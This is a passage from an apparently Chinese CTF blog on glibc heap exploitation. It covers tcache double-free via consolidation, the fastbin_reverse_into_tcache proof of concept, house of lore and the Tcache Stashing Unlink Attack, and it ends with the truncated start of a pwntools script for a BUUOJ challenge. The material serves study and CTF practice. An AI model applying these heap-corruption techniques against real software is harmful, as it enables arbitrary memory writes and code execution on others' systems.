<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">       x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"Allocating a chunk for later consolidation"</span>);</span><br><span class="line">   <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"Allocating the victim chunk."</span>);</span><br><span class="line">   <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>

<p>随后把tcache填满，释放a和prev,释放a和prev，这个时候a和prev合并了，都在unsortedbin中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">       <span class="built_in">free</span>(x[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">   <span class="built_in">free</span>(a);</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">   <span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure>

<p>然后实现double free,此时没有相同指针在bin和tcache中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">   <span class="comment">/*VULNERABILITY*/</span></span><br></pre></td></tr></table></figure>

<p>最后更改fd，完美</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"We simply overwrite victim's fwd pointer"</span>);</span><br><span class="line">  b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// take target out</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now we can cash out the target chunk."</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The new chunk is at %p\n"</span>, c);</span><br></pre></td></tr></table></figure>

<h2 id="0x02-fastbin-reverse-into-tcache"><a href="#0x02-fastbin-reverse-into-tcache" class="headerlink" title="0x02 fastbin_reverse_into_tcache"></a>0x02 fastbin_reverse_into_tcache</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"This attack is intended to have a similar effect to the unsorted_bin_attack,\n"</span></span><br><span class="line">    <span class="string">"except it works with a small allocation size (allocsize &lt;= 0x78).\n"</span></span><br><span class="line">    <span class="string">"The goal is to set things up so that a call to malloc(allocsize) will write\n"</span></span><br><span class="line">    <span class="string">"a large unsigned value to the stack.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">    <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* p = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span></span><br><span class="line">    <span class="string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span></span><br><span class="line">    <span class="string">"already full, it will go in the fastbin.\n\n"</span>,</span><br><span class="line">    p</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span></span><br><span class="line">    <span class="string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span></span><br><span class="line">    <span class="string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span></span><br><span class="line">    <span class="string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span></span><br><span class="line">    <span class="string">"a single free is sufficient.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"The stack address that we intend to target: %p\n"</span></span><br><span class="line">    <span class="string">"It's current value is %p\n"</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"Now we use a vulnerability such as a buffer overflow or a use-after-free\n"</span></span><br><span class="line">    <span class="string">"to overwrite the next pointer at address %p\n\n"</span>,</span><br><span class="line">    p</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in p.</span></span><br><span class="line">  *(<span class="keyword">size_t</span>**)p = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"Let's just print the contents of our array on the stack now,\n"</span></span><br><span class="line">    <span class="string">"to show that it hasn't been modified yet.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span></span><br><span class="line">    <span class="string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span></span><br><span class="line">    <span class="string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span></span><br><span class="line">    <span class="string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span></span><br><span class="line">    <span class="string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span></span><br><span class="line">    <span class="string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span></span><br><span class="line">    <span class="string">"pointer is written to the stack.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span></span><br><span class="line">    <span class="string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span></span><br><span class="line">    <span class="string">"That's because the value on the stack is treated as a next pointer in the\n"</span></span><br><span class="line">    <span class="string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The contents of our array on the stack now look like this:\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个给的代码例子看起来貌似很复杂，但实际上是挺简单的过程，概括起来就是</p>
<p>先把tcache填满，然后再给fastbin填6个</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">    <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* p = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span></span><br><span class="line">    <span class="string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span></span><br><span class="line">    <span class="string">"already full, it will go in the fastbin.\n\n"</span>,</span><br><span class="line">    p</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    <span class="built_in">stderr</span>,</span><br><span class="line">    <span class="string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span></span><br><span class="line">    <span class="string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span></span><br><span class="line">    <span class="string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span></span><br><span class="line">    <span class="string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span></span><br><span class="line">    <span class="string">"a single free is sufficient.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>然后再修改fastbin尾部那个chunk的fd,把tcache清空。当从fastbin中取出chunk的时候，会把其它的fastbin中的chunk反向插入到tcache中，这样就可以实现把目的地址的fd写上一个堆地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Overwrite linked list pointer in p.</span></span><br><span class="line"> *(<span class="keyword">size_t</span>**)p = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"> <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"> <span class="built_in">fprintf</span>(</span><br><span class="line">   <span class="built_in">stderr</span>,</span><br><span class="line">   <span class="string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span></span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Empty tcache.</span></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">fprintf</span>(</span><br><span class="line">   <span class="built_in">stderr</span>,</span><br><span class="line">   <span class="string">"Let's just print the contents of our array on the stack now,\n"</span></span><br><span class="line">   <span class="string">"to show that it hasn't been modified yet.\n\n"</span></span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">fprintf</span>(</span><br><span class="line">   <span class="built_in">stderr</span>,</span><br><span class="line">   <span class="string">"\n"</span></span><br><span class="line">   <span class="string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span></span><br><span class="line">   <span class="string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span></span><br><span class="line">   <span class="string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span></span><br><span class="line">   <span class="string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span></span><br><span class="line">   <span class="string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span></span><br><span class="line">   <span class="string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span></span><br><span class="line">   <span class="string">"pointer is written to the stack.\n"</span></span><br><span class="line">   <span class="string">"\n"</span></span><br><span class="line">   <span class="string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span></span><br><span class="line">   <span class="string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span></span><br><span class="line">   <span class="string">"That's because the value on the stack is treated as a next pointer in the\n"</span></span><br><span class="line">   <span class="string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span></span><br><span class="line">   <span class="string">"\n"</span></span><br><span class="line">   <span class="string">"The contents of our array on the stack now look like this:\n\n"</span></span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> <span class="built_in">fprintf</span>(</span><br><span class="line">   <span class="built_in">stderr</span>,</span><br><span class="line">   <span class="string">"\n"</span></span><br><span class="line">   <span class="string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span>,</span><br><span class="line">   q</span><br><span class="line"> );</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache Stashing Unlink Attack利用</title>
    <url>/year/09/14/cl7iordpc0026293fpv8yhfwy/</url>
    <content><![CDATA[<p>这种利用方法类似于house of lore,总结一下，留个模板以后备用</p>
<a id="more"></a>

<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="1-1-house-of-lore"><a href="#1-1-house-of-lore" class="headerlink" title="1.1 house of lore"></a>1.1 house of lore</h3><h4 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h4><p>分配任意指定位置的 chunk，从而修改任意地址的内存。（任意地址写）</p>
<h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><p>能控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">    hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">    (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">    processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">    anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 若结果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="keyword">if</span> ( ( victim = last (bin) ) != bin )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">        <span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">        <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line">        <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">        <span class="comment">//执行更为细致的检查</span></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure>

<p>首先smallbin 如果 malloc的话，chunk是从链表尾部取的。如果free的话，chunk是添加到链表头部的(靠近bin的位置)。</p>
<p>现在small bin中有两个chunk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                        fd</span><br><span class="line">     |-----------------------------------------|</span><br><span class="line">     ↓        fd                  fd           |</span><br><span class="line">|--------|---------&gt;|---------|---------&gt;|----------|</span><br><span class="line">|smallbin|          |  chunk1 |          |  chunk2  | </span><br><span class="line">|--------|&lt;---------|---------|&lt;---------|----------|</span><br><span class="line">     |         bk                   bk        ↑</span><br><span class="line">     |                                        | </span><br><span class="line">     |----------------------------------------|</span><br><span class="line">     					bk</span><br></pre></td></tr></table></figure>

<p>现在我们将 chunk2的 bk修改掉，fd不变</p>
<p>然后让fake_chunk的fd指向chunk2…..</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br></pre></td></tr></table></figure>

<p>然后就可以把这个fake_chunk放到samll bin上了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>

<p>有一说一，这个条件还挺苛刻的</p>
<h2 id="0x02-Tcache-Stashing-Unlink-Attack"><a href="#0x02-Tcache-Stashing-Unlink-Attack" class="headerlink" title="0x02 Tcache Stashing Unlink Attack"></a>0x02 Tcache Stashing Unlink Attack</h2><h3 id="1-1-攻击目标"><a href="#1-1-攻击目标" class="headerlink" title="1.1 攻击目标"></a>1.1 攻击目标</h3><ol>
<li>向任意指定位置写入指定值。</li>
<li>向任意地址分配一个Chunk。</li>
</ol>
<h3 id="1-2-攻击前提"><a href="#1-2-攻击前提" class="headerlink" title="1.2 攻击前提"></a>1.2 攻击前提</h3><ol>
<li>能控制 Small Bin Chunk 的 bk 指针。</li>
<li>程序可以越过Tache取Chunk。(使用calloc即可做到)</li>
<li>程序至少可以分配两种不同大小且大小为unsorted bin的Chunk</li>
</ol>
<h3 id="1-3-攻击原理"><a href="#1-3-攻击原理" class="headerlink" title="1.3 攻击原理"></a>1.3 攻击原理</h3><p>我们首先分析<code>House of Lore Attack</code>中所忽视的Tcache相关代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE <span class="comment">//如果程序启用了Tcache</span></span></span><br><span class="line">        <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">        stash them in the tcache.  */</span></span><br><span class="line">        <span class="comment">//遍历整个smallbin，获取相同size的free chunk</span></span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span></span><br><span class="line">            <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">            <span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = last (bin) ) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果成功获取了Chunk</span></span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    <span class="comment">//设置标志位</span></span><br><span class="line">                    set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                    <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                    <span class="comment">//取出最后一个Chunk</span></span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line">                    <span class="comment">//将其放入到Tcache中</span></span><br><span class="line">                    tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>其实发现一个很明显的地方，注意他把剩下的small_bin放入tcache的操作没有做任何的检查。</p>
<p>但是此处又有了矛盾的地方！</p>
<p><strong>首先，在引入Tcache后，Tcache中的Chunk拥有绝对优先权，我们不能越过Tcache向SmallBin中填入Chunk，也不能越过Tcache从SmallBin中取出Chunk。（除非Tcache已经处于FULL状态）</strong></p>
<p>然后，我们如果要在这里启动攻击，那么要求<code>SmallBin</code>中至少有两个Chunk(否则无法进入While中的if语句块)，<strong>同时要求Tcache处于非空状态。</strong></p>
<p>那样就产生了矛盾，导致这个漏洞看似无法利用。</p>
<p>但是<code>calloc</code>函数有一个很有趣的特性，它不会从<code>Tcache</code>拿<code>Chunk</code>，因此可以越过第一条矛盾“不能越过<code>Tcache</code>从<code>SmallBin</code>中取出<code>Chunk</code>”。</p>
<p>然后是<code>Unsorted Bin</code>的<strong><code>last remainder</code></strong>基址，当申请的Chunk大于<code>Unsorted Bin</code>中Chunk的大小且其为<code>Unsorted Bin</code>中的唯一<code>Chunk</code>时，该<code>Chunk</code>不会进入<code>Tcache</code>。</p>
<p>那么，再看这个图</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">                        fd</span><br><span class="line">     |-----------------------------------------|</span><br><span class="line">     ↓        fd                  fd           |</span><br><span class="line">|--------|---------&gt;|---------|---------&gt;|----------|</span><br><span class="line">|smallbin|          |  chunk1 |          |  chunk2  | </span><br><span class="line">|--------|&lt;---------|---------|&lt;---------|----------|</span><br><span class="line">     |         bk                   bk        ↑</span><br><span class="line">     |                                        | </span><br><span class="line">     |----------------------------------------|</span><br><span class="line">     					bk</span><br></pre></td></tr></table></figure>

<p>如果我们把chunk1的bk改掉，fd不变</p>
<p>fd不变就可以绕过第一个完整链的检查,并且可以通过解链操作向fake_chunk+0x10的位置写入一个很大的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>

<p>那么，当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache。</p>
<h3 id="0x03-例题-BUUOJ-2020-新春红包题-3"><a href="#0x03-例题-BUUOJ-2020-新春红包题-3" class="headerlink" title="0x03 例题 BUUOJ-2020 新春红包题-3"></a>0x03 例题 BUUOJ-2020 新春红包题-3</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size_choice, content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your input: '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input the red packet idx: '</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span>)</span><br><span class="line">    